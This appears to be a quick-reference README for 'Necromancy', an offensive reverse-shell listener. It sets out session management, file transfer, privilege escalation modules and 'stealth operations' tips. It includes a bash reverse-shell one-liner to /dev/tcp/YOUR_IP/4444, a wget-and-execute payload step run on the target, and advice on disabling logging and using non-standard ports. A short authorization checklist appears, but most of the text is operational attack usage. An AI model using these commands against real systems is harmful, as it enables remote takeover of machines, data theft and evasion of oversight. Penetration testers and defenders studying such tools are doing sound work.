# ⚡ Necromancy Quick Reference Guide

## 🚀 Essential Commands

### Starting Necromancy
```bash
# Default listener
./necromancy

# Custom port
./necromancy -p 8080

# Multiple ports
./necromancy -p 4444,4445,4446

# With HTTP server
./necromancy -p 4444 -s /tmp/files -w 8000
```

### Main Menu Navigation
```
s  - View sessions
p  - Show payloads
m  - Browse modules
i  - List interfaces
n  - Network info
q  - Quit
```

### Session Management
```bash
# List sessions
> s

# Connect to session
> interact 1

# Kill session
> kill 1

# Kill all sessions
> kill *

# Upload file
> upload /local/file.txt /remote/file.txt

# Download file
> download /remote/file.txt /local/file.txt
```

### File Manager (in session)
```
Navigation:
↑/↓     - Navigate files
Enter   - Open/execute
Backspace - Parent directory
r       - Refresh

Operations:
d       - Download file
u       - Upload file
x       - Delete file/directory
n       - New file
m       - New directory
e       - Edit file
c       - Copy path
v       - Paste
a       - Select all

System:
h       - Help
q       - Exit file manager
F12     - Detach from session
```

### Module Usage
```bash
# List modules
> m

# Execute module
> m peass

# Execute specific module
> m linux_exploit_suggester
```

## 📋 Common Workflows

### Basic Reverse Shell Setup
```bash
# 1. Start listener
./necromancy -p 4444

# 2. Generate payload
> p
# Copy bash payload: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# 3. Execute on target
# Paste payload on target system

# 4. Interact with session
> s
> interact 1
```

### File Transfer Workflow
```bash
# 1. Start with HTTP server
./necromancy -p 4444 -s /home/user/payloads -w 8000

# 2. On target, download file
wget http://YOUR_IP:8000/payload.sh
chmod +x payload.sh
./payload.sh
```

### Multi-Session Management
```bash
# 1. Start multi-listener
./necromancy -p 4444,4445,4446

# 2. Connect to different sessions
> s
> interact 1  # First session
> interact 2  # Second session
> interact 3  # Third session
```

### Privilege Escalation
```bash
# 1. Get basic shell
./necromancy -p 4444

# 2. Upgrade to PTY (automatic)
# Shell will auto-upgrade if possible

# 3. Run enumeration
> m peass

# 4. Check for exploits
> m linux_exploit_suggester
```

## 🔧 Troubleshooting Quick Fixes

### Connection Issues
```bash
# Check if port is available
netstat -tulpn | grep 4444

# Test with netcat
nc -lvp 4444

# Use different port
./necromancy -p 4445
```

### Shell Issues
```bash
# Force PTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Fix terminal size
stty raw -echo; fg
export TERM=xterm
```

### File Transfer Issues
```bash
# Simple file upload
echo 'content' > file.txt

# Base64 encode
cat file.txt | base64

# Decode on target
echo 'BASE64_CONTENT' | base64 -d > file.txt
```

## 🛡️ Security Quick Tips

### Before Testing
- [ ] Get written authorization
- [ ] Define scope clearly
- [ ] Set up isolated environment
- [ ] Establish communication channels

### During Testing
- [ ] Document all actions
- [ ] Minimize system impact
- [ ] Monitor for issues
- [ ] Maintain communication

### After Testing
- [ ] Remove all artifacts
- [ ] Verify system integrity
- [ ] Provide detailed report
- [ ] Include remediation advice

## 📊 Performance Tips

### For High-Latency Networks
```bash
# Use simple commands
ls -la
pwd
whoami

# Avoid complex pipes
echo 'text' | grep 'pattern' | awk '{print $1}'
```

### For Multiple Targets
```bash
# Use session persistence
./necromancy -p 4444 -m 5

# Use different ports for different targets
./necromancy -p 4444  # Target 1
./necromancy -p 4445  # Target 2
./necromancy -p 4446  # Target 3
```

### For Stealth Operations
```bash
# Use non-standard ports
./necromancy -p 31337,1337,8080

# Disable logging
./necromancy -p 4444 -L

# Use bind shells instead of reverse
./necromancy -c target.com -p 4444
```

---

**Quick Reference** - Keep this handy for fast operations!